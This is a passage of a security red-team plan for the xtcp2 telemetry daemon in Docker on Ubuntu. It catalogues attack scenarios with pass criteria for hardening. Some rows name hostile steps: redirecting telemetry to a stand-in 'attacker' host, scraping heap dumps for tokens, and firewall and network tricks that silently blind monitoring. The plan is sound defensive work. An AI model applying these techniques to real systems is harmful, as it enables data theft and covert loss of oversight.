# Red-team plan: xtcp2 in a container on Ubuntu 24.04

Status: proposal — not yet executed. This document defines an adversary
simulation program for the deployed configuration xtcp2 actually runs in
production: the OCI image under Docker on Ubuntu 22.04/24.04 hosts, with
`/var/lib/xtcp2` bind-mounted and bearer auth for scraping (see TODO-SOON §29
for the prod topology this mirrors). The attacker is assumed to have full
knowledge of the open-source repository at
https://github.com/randomizedcoder/xtcp2.

The execution companion — harness architecture, per-phase tasks, and
definition of done — is [redteam-implementation.md](redteam-implementation.md).

Related: [listener security guide](security.md), [hardening design](design-listener-security-hardening.md),
[integration testing](integration-testing.md), [TODO-SOON §29](../TODO-SOON.md)
(already proposes Vagrant-on-Ubuntu boxes for prod-kernel coverage — this plan
shares that harness foundation).

## Contents

- [Purpose and ground rules](#purpose-and-ground-rules)
- [Assumptions and attacker profiles](#assumptions-and-attacker-profiles)
- [System under test](#system-under-test)
- [Attack surface inventory](#attack-surface-inventory)
- [Scenario catalog](#scenario-catalog)
  - [RT-1 Reconnaissance and information disclosure](#rt-1-reconnaissance-and-information-disclosure)
  - [RT-2 Authentication and credential attacks](#rt-2-authentication-and-credential-attacks)
  - [RT-3 Admin API abuse](#rt-3-admin-api-abuse)
  - [RT-4 Denial of service against the daemon](#rt-4-denial-of-service-against-the-daemon)
  - [RT-5 Host attacks through xtcp2 (netlink and capabilities)](#rt-5-host-attacks-through-xtcp2-netlink-and-capabilities)
  - [RT-6 Filesystem and Unix-socket attacks](#rt-6-filesystem-and-unix-socket-attacks)
  - [RT-7 Artifact and supply-chain attacks](#rt-7-artifact-and-supply-chain-attacks)
  - [RT-8 Parser and protocol attacks](#rt-8-parser-and-protocol-attacks)
  - [RT-9 Network-position attacks](#rt-9-network-position-attacks)
  - [RT-10 Dependency and CVE surface](#rt-10-dependency-and-cve-surface)
  - [RT-11 Monitoring-blindness from a co-tenant container](#rt-11-monitoring-blindness-from-a-co-tenant-container)
- [Vagrant harness design](#vagrant-harness-design)
- [Flake and Makefile integration](#flake-and-makefile-integration)
- [Severity and triage conventions](#severity-and-triage-conventions)
- [Phased roadmap](#phased-roadmap)
- [Deliverables and success criteria](#deliverables-and-success-criteria)
- [Out of scope](#out-of-scope)

## Purpose and ground rules

1. **Prove or disprove exploitability on the real deployment shape.** The
   microVM checks boot NixOS guests; prod failures have already been invisible
   there (TODO-SOON §29). The same blind spot applies to security posture.
2. **Assume the attacker read the repo.** In particular they read
   [security.md](security.md), whose "Resource protections and implementation
   limits" section is, from an attacker's perspective, a target list:
   `max_connections`/accept-rate limits not wired, no TLS, auth off by default,
   streaming auth checked only at stream start, and the CLI/env auth-mode
   validation gaps. Every documented limitation becomes at least one scenario.
3. **Every scenario is automated and reproducible**, with explicit pass/fail
   assertions, runnable locally from this repo on `l` via Vagrant/libvirt.
4. **No scenario is skipped because "that's the operator's job."** Where the
   mitigation is deployment configuration (firewall, caps, mounts), the test
   asserts what the shipped defaults do and what the recommended hardening
   changes; the delta is the finding.
5. **Findings feed fixes and regression tests**, not just a report: each
   CONFIRMED result becomes either a code fix with a unit/VM test or a
   documented deployment requirement with a detection (metric/log/audit).
6. **Attack tools are honest**: use the real protocols (grpcurl, xtcp2client,
   xtcp2ctl, slowhttptest, h2load, socat), not simulations of attacks.

## Assumptions and attacker profiles

| Profile | Position | Knowledge | Example goal |
|---|---|---|---|
| A1 co-tenant | another container on the same Docker bridge / same netns | full source, no creds | scrape socket records, find admin surface open, DoS the daemon, or **blind it: stop xtcp2 from reporting the host's and other tenants' TCP statistics** (RT-11) |
| A2 on-path/L2 | VM or container sharing the L2 segment, or host on the bridge | full source, sniffing | capture raw bearer token, replay HMAC, reach loopback-bound listeners via `route_localnet` |
| A3 remote | another host ≥1 L3 hop away | full source | reach :9088/:8889, brute force tokens, TTL-limit probing |
| A4 admin-adjacent | holds a read credential or a leaked admin token | full source | escalate to full admin: pprof, Set, exfil |
| A5 artifact poisoner | controls an S3 bucket / artifact the daemon ingests | full source | ASN parquet/zstd bomb, S3 redirection |
| A6 host-side | can write to bind mounts or the daemon's UDS dir | full source | socket hijack, baseline poisoning |

Not in scope as attackers: the xtcp2 maintainers, CI, or the fleet
infrastructure itself (that is supply-chain hardening, tracked separately).

## System under test

The baseline deployment the harness builds (mirroring TODO-SOON §29's prod
table):

- Ubuntu 24.04 guest (stock 6.8 kernel; also one 22.04/5.15 row for parity),
  Docker installed from Docker's apt repo.
- xtcp2 OCI image built from this repo (`nix build .#oci-xtcp2`, `docker load`),
  run as prod does: `/var/lib/xtcp2` bind-mounted, read token via
  `LISTENER_RAW_TOKEN_FILE`, `--network host` **and** bridge-network variants
  (both shapes occur in the wild; they differ in exposure).
- Caps: `CAP_NET_ADMIN`, `CAP_SYS_ADMIN` (+`CAP_SYS_PTRACE` variant for host
  PID discovery; `-cap-drop` variants to find the minimum set).
- Mounts: `/run/netns` and `/run/docker/netns` bind `ro`/`ro,rslave`
  (per runpod/ansible-host#1120) vs `rprivate` (the known-bad shape).
- Attacker infrastructure: a second container on the same bridge
  (co-tenant), a socat/HTTP catcher for exfil assertions, an attacker VM on a
  separate libvirt network for the remote profile, and the repo's own clients
  (`xtcp2client`, `xtcp2ctl`, vendored `grpcurl`) as attack tools. For RT-11
  the co-tenant attacker container is provisioned in four capability tiers
  (`XTCP2_ATTACKER=plain|read-cred|privileged|admin`), and the victim set is
  concrete: base-OS sockets (host netns), two "useful work" containers
  (`tcp_server`/`tcp_client` population) whose records must keep flowing, and
  the attacker container whose reporting may legitimately stop — the
  assertion in every RT-11 scenario is *the victims' records keep arriving at
  the destination within the poll cadence*, not merely that the daemon
  process stays up.

## Attack surface inventory

Surfaces and their current state, from code and docs:

| Surface | Exposure | Current protection |
|---|---|---|
| Prometheus HTTP `:9088` (default wildcard TCP) | metrics, `/metrics-all`, monitor category/detail paths, `/healthz`, `/readyz`, `/debug/pprof/*`, optional `/ip`/`/i` | optional bearer/HMAC; read/admin split; TTL 3; HTTP timeouts; 10 in-flight scrape cap; detail-path caps; **no connection/accept-rate caps** |
| gRPC `:8889` (default wildcard TCP) | reflection, health, `FlatRecords` streaming, `ConfigService` (Get read; Set/SetPollFrequency/SetS3Upload/SetEnvelopeFlush admin), monitor admin (Rebaseline/Resync), poll/burst | same auth policy; 4 MB message limit, 20 streams/conn; **no connection caps**; no TLS |
| Optional loopback IP listener (`:9089`) | unauthenticated `/ip`/`/i` inspection | loopback-only bind + non-loopback peer close, TTL 1 |
| UDS listeners (opt-in) | same HTTP/gRPC APIs over a socket path | `0600` default mode, parent dir must pre-exist, stale-socket unlink by default, regular-file/symlink refused |
| Netlink (kernel → daemon) | inet_diag dumps, RTM_GET*, ethtool, RDMA NLDEV reads/subscription; goip write verbs **dry-run only** | read-only by design; needs verification |
| `/proc` walk + `/run/netns`, `/run/docker/netns` | namespace discovery via setns | `CAP_SYS_ADMIN`/`CAP_SYS_PTRACE`; mount-propagation dependent |
| Filesystem writes | `/var/lib/xtcp2` baseline, `GOIP_WRITE_OUT` dry-run files, S3/Parquet uploads, UDS socket creation/cleanup | modes checked at startup; no integrity checks on baseline |
| Artifacts in | ASN bootstrap/cache/current/previous parquet+zst files, S3 refresh | pinned bootstrap (`nix/ipmeta-bootstrap-lock.json`); live refresh uses S3 creds |
| Config inputs | flags, env, `XTCP_CONFIG_JSON` (soft restart), secret `_FILE`s, full `ConfigService.Set` | protovalidate on Set; redaction of secrets in Get/Set responses; **unrecognized CLI auth-mode → disabled; invalid env mode ignored** |

## Scenario catalog

Each scenario lists: preconditions, steps, expected behavior **today**, the
pass criteria, and existing coverage. Severity if the pass criteria fail is
given per scenario using the [severity scale](#severity-and-triage-conventions).
Scenario IDs are stable (`rt-N-M`) and become script filenames in the harness.

### RT-1 Reconnaissance and information disclosure

| ID | Scenario | Steps | Expected today | Pass criteria | Severity if failed |
|---|---|---|---|---|---|
| rt-1-1 | Unauthenticated co-tenant scrape | from attacker container on the same bridge: `curl :9088/metrics` (default config) | 200 with full socket/link metrics: internal IPs, ports, RTTs, host topology | reveals the default exposure; with auth on, 401 | S2 (documented default; test proves it) |
| rt-1-2 | Unauthenticated record streaming | `xtcp2client`/grpcurl FlatRecords with no token | full `XtcpFlatRecord` stream incl. peer addresses, container IDs, uplink NIC/LLDP | with auth on: Unauthenticated; default: stream succeeds | S2 |
| rt-1-3 | gRPC reflection enumeration | grpcurl reflect/list, no creds | service list incl. admin methods when auth disabled | with auth on: refused | S3 |
| rt-1-4 | goip HTTP inspection recon | enable `-linkMonitorIPPaths`; `/ip/addr`, `/ip/route`, `/ip/link` | host routes/addresses disclosed to any read credential (or unauthenticated by default) | with auth on: read-classified; loopback listener: loopback peers only | S3 |
| rt-1-5 | Health/ready disclosure | unauth `/healthz`, `/readyz` | readiness state without credentials (by design; no unauth exception) | assert both 401 when auth on (documented), and note K8s-probe tradeoff | S4 |
| rt-1-6 | Version/flag fingerprint | scrape metric names/labels | identifies binary flavor, enrichers, version | fingerprint is inherent; keep it in the threat model for 0-day targeting | S4 |

### RT-2 Authentication and credential attacks

| ID | Scenario | Steps | Expected today | Pass criteria | Severity if failed |
|---|---|---|---|---|---|
| rt-2-1 | Raw-token online brute force | co-tenant/remote hammers `/metrics` and gRPC with candidate tokens | each failure delayed 20–200 ms; no rate limit, no lockout, no cap on connections | brute force is infeasible only via token entropy; assert jitter applied (`xtcp_counts` auth-failure metrics), no 5xx, and file an issue to add fail2ban-style counters/firewall guidance | S3 (mitigation = ops) |
| rt-2-2 | HMAC token capture and replay | on-path tcpdump of a read client; replay token within ±1 min and after | token valid for previous/current/next minute bucket; stream started before expiry is not revalidated (documented) | replay inside window succeeds (documented); assert replay outside skew fails; assert long-held stream outlives token only until reconnect | S3 |
| rt-2-3 | Auth-mode confusion footguns | (a) `-listenerAuthMode rawy` typo; (b) `LISTENER_AUTH_MODE=unsupported` env; (c) unreadable `LISTENER_RAW_TOKEN_FILE` | (a)+(b) silently end up disabled; (c) previous credential retained — all documented | daemon remains or becomes **unauthenticated**; scenario proves it and the pass criteria is the filed hardening issue: unrecognized mode must fail startup | S2 (today) → fix to S3 |
| rt-2-4 | Read/admin split enforcement | read token on `/debug/pprof/`, `ConfigService.Set`, `PollFlatRecords`, monitor `Rebaseline` | 403 / PermissionDenied; unknown methods require admin | all admin surfaces denied to read token | S3 regression gate |
| rt-2-5 | Token in URL/query | `/metrics?token=...` | rejected (no query support by design) | stays rejected | S4 regression |
| rt-2-6 | Timing side channel on token compare | statistical timing of raw-token auth | constant-time compare + random jitter | no measurable per-position timing signal at practical sample sizes | S4 |
| rt-2-7 | Duplicate/malformed Authorization headers | two headers, `Bearer` alone, `Basic x`, lowercase `bearer` | duplicates/empties rejected; scheme case-insensitive | matches parser table in the hardening design | S4 regression |
| rt-2-8 | Plaintext transport token capture | tcpdump on victim-VM host NIC during an authenticated scrape | raw bearer visible in clear (no TLS) | token captured ⇒ documented; assert recommended mitigations (TLS proxy) are the only gap; no app-layer leak of HMAC key | S3 (documented) |

### RT-3 Admin API abuse

Assume the attacker obtained or guessed an admin credential, or the deployment
left auth disabled. These test what admin access is worth.

| ID | Scenario | Steps | Expected today | Pass criteria | Severity if failed |
|---|---|---|---|---|---|
| rt-3-1 | Telemetry redirection (data exfil) | `ConfigService.Set` with `dest: tcp:attacker:9999` (or `http:`, `kafka:`), keep sockets populated | soft-restart into new config; daemon ships all socket records to the catcher | exfil succeeds end-to-end (this is by design); pass criteria = the finding: egress from the daemon container must be restricted by deployment policy; assert detection exists (config-change audit/metric) | S2 |
| rt-3-2 | S3 destination exfil with inherited creds | `Set` with `dest: s3:attacker-bucket`, empty S3 fields inherit running creds | daemon uploads its own parquet stream to attacker bucket | exfil succeeds; pass criteria = finding + detection | S2 |
| rt-3-3 | Poll-frequency CPU DoS | `SetPollFrequency` to minimum, loop `PollFlatRecords` bursts | daemon re-polls all namespaces on demand | bounded CPU/mem (assert via cgroup limits on the container); document amplification factor vs socket count | S3 |
| rt-3-4 | Envelope/memory manipulation | `SetEnvelopeFlush` extremes (rows/bytes/interval) | flush caps drive buffering | no unbounded growth under admin-set extremes; assert memory ceiling behavior | S3 |
| rt-3-5 | pprof resource abuse and secret exposure | `/debug/pprof/heap`, `/debug/pprof/allocs` in a loop; grep heap dump for token/HMAC key/S3 secret | admin-only; heap contains secrets (documented) | heap profile leaks bearer tokens/HMAC keys from memory — proves admin ≈ secret compromise; pass criteria = finding: secrets should live in a protected page or be cleared before profiling, or pprof disabled by default | S2 |
| rt-3-6 | Soft-restart churn | repeated `Set` (config back and forth) | each Set ends in `syscall.Exec` restart | restart loop does not wedge listeners or leak UDS files (assert socket cleanup); rate of churn bounded only by attacker | S3 |
| rt-3-7 | Config redaction regression | read creds: `Get`, monitor status; inspect all responses | secrets redacted | no secret value in any read response | S3 regression gate |

### RT-4 Denial of service against the daemon

| ID | Scenario | Steps | Expected today | Pass criteria | Severity if failed |
|---|---|---|---|---|---|
| rt-4-1 | Connection exhaustion | co-tenant opens thousands of idle connections to :9088 and :8889 | **`max_connections`/accept-rate not wired** (documented); no global caps | daemon reaches fd/memory limits or degrades; container OOM-kill or accept failure. Pass criteria = the fix issue (wire the limits) plus a documented stopgap (systemd `LimitNOFILE`, `max_map_count`, firewall conn limits) | S2 today |
| rt-4-2 | Slowloris HTTP | slowhttptest body/header stall against :9088 | read-header 5 s / read 10 s / write 15 s / idle 30 s timeouts | per-connection resources bounded; N stalled conns cost bounded memory; combine with rt-4-1 ceiling | S3 |
| rt-4-3 | gRPC stream abuse | h2load/ghz: many conns × 20 streams, 4 MB messages, reflection flood | per-conn stream cap 20, 4 MB message limit; no global quota | bounded degradation only; assert no goroutine leak after close (metrics/`/debug` after test — or pprof via loopback) | S3 |
| rt-4-4 | Slow FlatRecords consumer | open authenticated stream, read 1 msg/30 s, never cancel | gRPC flow control should backpressure the daemon pipeline | daemon memory bounded under stalled consumers for 1 h; no OOM; record the envelope-buffer high-water mark | S3 |
| rt-4-5 | Scrape storm | 100 parallel scrapes of `/metrics`, `/metrics-all`, detail paths | 10 in-flight cap on main path; category caps 4; 10 s handler timeouts | 503/queue behavior matches docs; no pileup; p99 latency recorded | S4 |
| rt-4-6 | Namespace/socket churn storm | run `nsTest` + a script creating/destroying netns and 10k sockets rapidly in co-tenant containers visible to the daemon | reconcile before each poll; retry loops for vanished veths | no fd leak, no goroutine leak, bounded CPU, daemon survives 24 h churn (ties into TODO-SOON AI098) | S2 |
| rt-4-7 | Broker-outage buffering | kill the in-VM Redpanda; watch daemon | franz-go backoff with jitter (design doc) | memory bounded while dest is down; recovers on broker return; no unbounded queue | S3 |
| rt-4-8 | Admin-triggered poll amplification | (needs admin) poll burst against a host with 100 containers × 250 sockets | full-dump per poll | latency/CPU bounded; assert cgroup protection works | S3 |

### RT-5 Host attacks through xtcp2 (netlink and capabilities)

The central question from ops: *can xtcp2, from inside its container, take
actions that break or compromise the Ubuntu host?* Today's design says no —
the daemon only **reads** netlink; goip write verbs serialize to
`GOIP_WRITE_OUT` and refuse to apply. These scenarios verify that empirically
and measure blast radius if the daemon process itself is compromised.

| ID | Scenario | Steps | Expected today | Pass criteria | Severity if failed |
|---|---|---|---|---|---|
| rt-5-1 | Netlink write audit (assurance) | `strace -f -e trace=sendmsg,sendto` on the daemon for a full poll + link-monitor cycle + `/ip` sweeps; also static grep for `RTM_NEW/SET/DEL` send sites in the daemon (not goip CLI) | only GET/dump requests and subscription registers | zero write-class nlmsg_type sent; failure = S1-class bug | S1 if violated |
| rt-5-2 | setns scope audit | trace `setns` syscalls; verify target fd ns types | only netns entered, never user/pid/mount | netns-only | S2 if violated |
| rt-5-3 | Compromised-container blast radius (privileged) | exec a shell in the xtcp2 container run `--privileged` (or `--cap-add=ALL`) and attempt: link flap on host iface, `ip netns exec` into other netns, mount tricks | with host mounts (`/run/netns`, hostPID) the container can flip host links and enter other containers' netns | documents that privileged ≈ host compromise; pass criteria = minimum-cap deployment recipe (NET_ADMIN+SYS_ADMIN only, no SYS_PTRACE unless needed, no hostPID) and the finding that caps must be dropped | S1 guidance |
| rt-5-4 | Minimum-capability matrix | run daemon with each cap dropped; observe startup capability checks and function | capability checks explain missing privileges (existing feature) | produce the cap/feature matrix (discovery, inet_diag, ethtool, RDMA) so operators can drop SYS_ADMIN where mounts replace it | S3 |
| rt-5-5 | RDMA subscription on stock 6.8 | `rdma link add rxe0 type rxe netdev eth1` in the VM; daemon runs with embedded monitor | EOPNOTSUPP handled, baseline from polled state (TODO-SOON §29 row) | no fd leak / hot retry loop; `collection_healthy 1` | S3 |
| rt-5-6 | Mount-propagation visibility attack | co-tenant creates netns after daemon start; daemon has `rprivate` vs `ro,rslave` mounts of `/run/netns` | `rprivate`: new netns invisible + startup warning gauge (fixed 2026-11-03) | gauge `checkNetnsPropagation=private` set; `rslave` row collects it — Ubuntu/Docker reproduction of the runpod fix | S4 regression |
| rt-5-7 | Host resource side effects | `/proc` walk pressure with hostPID=true and 10k processes; psutil-load the host | procfs walks each poll | bounded CPU; no host-visible degradation at fleet scale | S4 |

### RT-6 Filesystem and Unix-socket attacks

| ID | Scenario | Steps | Expected today | Pass criteria | Severity if failed |
|---|---|---|---|---|---|
| rt-6-1 | UDS symlink attack | pre-create symlink at `/run/xtcp2/grpc.sock` path | refused (existing regular file/symlink refused) | startup fails safely | S4 regression |
| rt-6-2 | Stale-socket unlink DoS | point `-grpcListenAddress` at another live service's socket path in a shared dir | daemon unlinks it without liveness probe (documented) | other service's socket removed ⇒ documented footgun; pass criteria = finding + issue (liveness probe or refuse-by-default), plus doc: private parent dir | S3 (documented) |
| rt-6-3 | Socket replacement race | attacker in same container swaps socket file after bind (world-writable parent) | no protection if parent dir is shared | hijack succeeds ⇒ documented requirement: dir `0700` owned by daemon user; scenario asserts chmod enforcement | S3 |
| rt-6-4 | Baseline poisoning | write crafted/corrupt baseline into bind-mounted `/var/lib/xtcp2` | corrupt baseline degrades monitor only (NixOS VM check exists; repeat on Ubuntu/Docker) | TCP collection unaffected; monitor down gauge set; crafted-but-valid baseline may fake alerts — assess whether integrity check (hash/mode) is warranted | S3 |
| rt-6-5 | Secret-file permission audit | ship token files 0644 in image/mount; check who reads | loader does not check file modes (documented) | finding: assert+document 0400 root-owned requirement; consider refusing world-readable secret files at startup | S3 |
| rt-6-6 | `GOIP_WRITE_OUT` abuse | run goip write verbs in-VM | request files written to configured path only, no kernel change | no write path reachable from any listener/API | S4 |

### RT-7 Artifact and supply-chain attacks

| ID | Scenario | Steps | Expected today | Pass criteria | Severity if failed |
|---|---|---|---|---|---|
| rt-7-1 | ASN parquet/zstd decompression bomb | craft 1 GB→200 GB ratio zst parquet; place as live-refresh artifact in the in-VM Garage/S3; trigger refresh | loader decompresses in process | daemon refuses or bounds artifact size/decompression (cap bytes read); failure ⇒ OOM on the monitoring host | S2 |
| rt-7-2 | Bootstrap artifact swap | replace `nix/ipmeta-bootstrap` lookup file with same-name different content; restart | pinned by lock at build time in Nix deploys; file-based deploys trust the mount | lockfile-integrity behavior documented for non-Nix deploys; consider embedded hash check at load | S3 |
| rt-7-3 | Poisoned artifact semantics | crafted parquet with adversarial prefix tables (bart trie stress: 100k prefixes) | longest-prefix lookup built at load | load time/CPU bounded; no panic; timeout on refresh path | S3 |
| rt-7-4 | Dependency CVE sweep | `govulncheck ./...` against the lock; check grpc/x/net/franz-go advisories (HTTP/2 rapid reset class) | go-sec lint exists; no govulncheck gate today | add govulncheck to the flake checks; zero reachable S1/S2 vulns at pinned versions | S3 gate |

### RT-8 Parser and protocol attacks

The daemon parses kernel-supplied netlink from *any namespace it can see* —
including attacker-created ones — and the optional `/ip/...` HTTP paths parse
attacker-controlled argv strings.

| ID | Scenario | Steps | Expected today | Pass criteria | Severity if failed |
|---|---|---|---|---|---|
| rt-8-1 | Hostile netns netlink stress | privileged co-tenant builds pathological netns: 500 veths, max-length ifnames, IPv6 addr labels, 10k routes, nested VLAN/macvlan stacks, rtnl multicast noise; daemon discovers it | typed parsers with fuzz-tested fixtures (pkg/xtcpnl fuzz targets exist) | no panic (daemon stays up), bounded memory/latency per poll; findings feed the fixture corpus | S2 |
| rt-8-2 | `/ip` argv-path fuzzing | authenticated (or loopback listener) requests: `/ip/route/show/dev/%FF%FF...`, invalid families, huge argv, NUL/percent tricks | argv-path parser with response-size bounds; ip_server tests exist | no panic; bounded response; add go-fuzz corpus from discovered crashes | S3 |
| rt-8-3 | Extended fuzz campaigns | run existing Go fuzz targets (nlparity, xtcpnl) long-duration in CI with VM-captured corpus seeds | fuzz targets exist, short runs | sustained campaigns (1 h+) clean; seed corpus from microvm capture dumps | S3 |
| rt-8-4 | gRPC malformed-message storm | grpcurl raw/ghz with malformed protos, oversized headers, bad HTTP/2 frames | 4 MB limit, grpc-go hardening | no crash; bounded error handling | S4 |

### RT-9 Network-position attacks

| ID | Scenario | Steps | Expected today | Pass criteria | Severity if failed |
|---|---|---|---|---|---|
| rt-9-1 | Bridge-network exposure | bridge-mode daemon container: are :9088/:8889 reachable from co-tenant and from the VM host? | yes (published or not? EXPOSE only; not published without `-p` — but with `--network host` all host interfaces) | document both modes' reachability matrices; recommended default = `-p 127.0.0.1:9088:9088` or UDS | S2 guidance |
| rt-9-2 | TTL=3 reach verification | remote attacker VM at 1 hop (same libvirt net) and at 4 hops (routed) | 1 hop: replies arrive; ≥3 hops: replies die | matches docs; confirms TTL is depth-limiting, not a firewall | S4 |
| rt-9-3 | `route_localnet` loopback reach | enable Docker bridge with `route_localnet=1`; co-tenant targets `172.17.0.1:9089` (loopback IP listener) | non-loopback peers are closed (CVE-2020-8558 class defense, vm-xtcp2-ip-listen covers NixOS) | Ubuntu/Docker reproduction: connection closed; log rate-limited | S3 regression |
| rt-9-4 | IPv6 exposure | attack over link-local v6 to wildcard listeners | wildcard `:9088` binds v6 too | same policy on v6; no bypass | S4 |
| rt-9-5 | Host-network-mode exposure | daemon with `--network host` (needed for host netns visibility) — probe all host interfaces, including from another VM | every host IP can reach the listeners | document mandatory firewall/auth for host-network mode; this is prod's actual shape per TODO §29 | S2 guidance |

### RT-10 Dependency and CVE surface

Covered by rt-7-4 (govulncheck gate) plus a periodic advisory review of the
direct deps that parse untrusted bytes: `klauspost/compress` (zstd),
`parquet-go`, `franz-go` (Kafka wire), `twmb` kmsg, grpc-go, x/net/http2.
Deliverable is the check, not per-CVE scenarios.

### RT-11 Monitoring-blindness from a co-tenant container

Dedicated family for the question: *the host runs Ubuntu + the xtcp2 container
+ several useful containers + one attacker container. What can the attacker do
so that TCP statistics about the base OS and the non-attacker containers never
get reported?* The reporting chain has six links an attacker can cut —
discover → dump → enrich → batch → deliver → scrape — plus the process itself.
Unlike RT-4 (which asks "can the daemon be knocked over"), RT-11 asks "can
reporting be stopped or falsified *while the daemon looks healthy*".

Rows are tiered by attacker capability; each tier is a Vagrant matrix row
(`XTCP2_ATTACKER=plain|read-cred|privileged|admin`).

**Tier 1 — unprivileged co-tenant, no credentials** (only needs to reach the
listeners; true with `--network host` or published ports):

| ID | Scenario | Vector and effect | Existing defense | Gap / assertion |
|---|---|---|---|---|
| rt-11-1 | Scrape-slot starvation | Prometheus handler runs with `MaxRequestsInFlight=10` (`cmd/xtcp2/xtcp2.go:50`); the 11th concurrent scrape gets an immediate 503. Attacker holds 10 scrapes open with slow reads (write timeout 15 s, so re-issue every ~10 s) and the real scraper receives 503 forever. Collection continues; *reporting* stops. | per-handler in-flight cap; 15 s write timeout | assert the 503 lockout works end-to-end from a co-tenant; finding: read-auth does **not** prevent it (a read credential holder can do the same legitimately), and unauthenticated-by-default makes it credential-free |
| rt-11-2 | FD exhaustion across the listener boundary | `max_connections`/accept-rate are not wired (documented). Thousands of idle connections to :9088/:8889 exhaust the process FD budget. Unlike rt-4-1, the target is not the API but the **collection path**: the per-namespace netlink sockets, `/proc` walk, and dockermeta reads all need FDs, and auth failures still consume the FD before the 401 | RLIMIT_NOFILE is per-process, idle timeouts 30–60 s | measure at which connection count polls start failing (`xtcp_counts` errors) vs. metrics still 200; finding = the unwired connection caps cross from API DoS into collection DoS |
| rt-11-3 | gRPC stream-slot grazing | 20 streams per connection, no global stream or connection quota; slow-reading `FlatRecords` streams and reflection/health spam add goroutines and buffer pressure to the shared process | 4 MB message cap, per-conn stream cap | bounded degradation only; assert no leak after churn (goroutine count via loopback pprof) |
| rt-11-4 | Own-netns dump amplification (poll-budget theft) | every cycle dumps *every* namespace on `-netlinkers 2` decoders with a 5 s per-namespace timeout. Attacker packs its own netns with tens of thousands of sockets (listener accept-queue backlog + timewait via self-SYN-flood + many listeners) so its dump alone eats seconds of the 10 s cadence; the host's and victims' dumps slide late or the cycle overruns | per-namespace `-timeout 5s`; poll timeout < frequency validation | measure poll-cycle latency and per-namespace coverage lag vs. attacker socket count; assert the timeout actually caps the thief |
| rt-11-5 | L2 kill of the delivery path | if the destination (Kafka/Redpanda, S3 endpoint container) is a sibling on the same bridge, both endpoints are on-path to each other: spoofed RSTs or ARP blackholing of the daemon→broker TCP. franz-go retries with jitter forever, so the daemon looks healthy while delivering nothing | jittered backoff (fleet design); reconnect | assert delivery-failure counters/metrics make the blind *visible* (`xtcp_counts` delivery errors, `xtcp_gauges` delivery health); finding: sustained L2 kill = silent-ish outage without an external watchdog |
| rt-11-6 | Host noisy-neighbor starvation | CPU fork bomb without cpu quota, memory pressure toward OOM (xtcp2 has real RSS), **conntrack-table exhaustion** (mass short-lived flows through host NAT → `nf_conntrack: table full` drops the daemon's outbound SYN to Kafka/S3), pid-limit exhaustion breaking the `/proc` walk | container cgroup limits are deployment policy | assert per-link effects and that each has a metric the fleet can alert on; finding: "absence of metrics must itself alert" — an external liveness watchdog is a deployment requirement |
| rt-11-7 | Own-netns parser crash attempt | pathological own netns (max-length ifnames, huge neighbor/route tables, nested veth/macvlan) hoping for a typed-parser panic; a panic in the poll path takes the whole daemon (the link-monitor panic-isolation issue is documented as open) | fixture-tested parsers, fuzz targets | daemon survives; any crash = S1-class finding feeding the fixture corpus |
| rt-11-8 | Self-churn + reconcile amplification | rapid own socket churn and `docker restart` loops make discovery/dockermeta/reconcile (which runs before each poll) burn the cycle; AI098 warn-storm | churn handling, retry logic | bounded reconcile cost; no coverage lag on victim namespaces |

**Tier 2 — co-tenant holding only a read credential:** rt-11-1/2/3 still apply
unchanged (FDs and stream slots are consumed before authorization, and
scraping `/metrics` is read-legal). This tier is the one most likely in real
fleet deployments: anyone granted a scraper token can blind the rest of the
fleet's view via rt-11-1 on any host they can reach. Assert and document.

**Tier 3 — privileged co-tenant** (CAP_SYS_ADMIN/CAP_NET_ADMIN in the init
userns, or `docker.sock` mounted — common in practice):

| ID | Scenario | Vector and effect | Assertion |
|---|---|---|---|
| rt-11-9 | Trivial kill via docker.sock / hostPID | `docker stop xtcp2`, or SIGKILL via hostPID — full blind, no daemon-side defense exists | document as a deployment invariant (socket not shared, no hostPID to untrusted tenants); the scenario proves the blast radius and belongs in the cap matrix (rt-5-3) |
| rt-11-10 | Host netfilter blind | `iptables -I OUTPUT ... --dport 9092 -j DROP` (or INPUT to :9088/:8889) — silent delivery or scrape blind while the daemon is healthy | delivery-error metrics must light up; finding: firewall tampering is only detectable via delivery health, so those metrics must page |
| rt-11-11 | Netns flood via mount propagation | thousands of netns registered into a `rslave`-propagated `/run/netns` → discovery/reconcile every cycle stretches past cadence; each flooded netns can also carry rt-11-4's socket bomb | measure coverage lag vs. netns count; the `checkNetnsPropagation` gauge must stay correct; finding: discovery needs a bound on namespaces-per-cycle or a priority order (host first) |
| rt-11-12 | Docker netns entry poisoning | with an rw bind of `/run/docker/netns` + shared propagation, replace victim netns files with dead inodes/symlinks → setns errors for *victim* namespaces → their sockets silently vanish from reports | error counters must increment and a namespace-level gauge must show the failure; silent drop = S2 finding |
| rt-11-13 | UDS unlink / baseline poisoning | rt-6-2/6-3/6-4 applied from a privileged neighbor | covered by RT-6 rows; repeat here in the Docker topology |

**Tier 4 — admin access** (auth disabled by default, or a stolen admin
token): the one-RPC full blind — `ConfigService.Set` with `dest: null:`
soft-restarts the daemon into discarding everything (rt-3-1's evil twin: not
exfiltration, just silence). Also `SetPollFrequency` to the maximum, pprof
OOM loops (rt-3-3/5), and Rebaseline spam for alert fatigue. Covered by RT-3
rows; the RT-11 framing asserts the *victim-visible symptom*: fleet sees no
records, no obvious error, unless config-change audit logging is on (it is —
assert `Set` is visible in logs/metrics as the detection).

The family's summary matrix (who can cut which link):

| Link | Tier 1 (no creds) | Tier 2 (read) | Tier 3 (privileged) | Tier 4 (admin) |
|---|---|---|---|---|
| discover | — | — | rt-11-11/12 | — |
| dump | rt-11-4/7/8 | rt-11-4/7/8 | rt-11-11 | rt-3-3 (poll abuse) |
| enrich | rt-11-6 (procfs starvation) | same | rt-11-11 | — |
| batch | rt-11-2 (FD/memory pressure) | same | same | rt-3-4 |
| deliver | rt-11-5/6 | rt-11-5/6 | rt-11-10, rt-11-9 | rt-3-1 (`dest: null` = full blind) |
| scrape | rt-11-1/2/3 | rt-11-1/2/3 | rt-11-10 | — |
| process | rt-11-7 (panic) | rt-11-7 | rt-11-9 | rt-3-5/6 |

Deliverable beyond scenarios: a **blind-detection runbook** — for each cut
link, the metric/log that reveals it (delivery errors, poll errors, FD gauges
if absent today → add them, restart count, config-change audit), and the rule
that absence-of-metrics pages (external watchdog on the container/process, not
just `up` gauges the daemon itself exports).

### RT-11 verification status of existing defenses

Already implemented and asserted green by these scenarios: per-namespace 5 s
dump timeout, poll-timeout < frequency validation, envelope row/byte caps,
`MaxRequestsInFlight` 503 behavior, franz-go jittered retry, link-monitor
degrade-not-exit, `checkNetnsPropagation` gauge. Known-open and expected to
CONFIRM (already documented): unwired `max_connections`/accept-rate, auth off
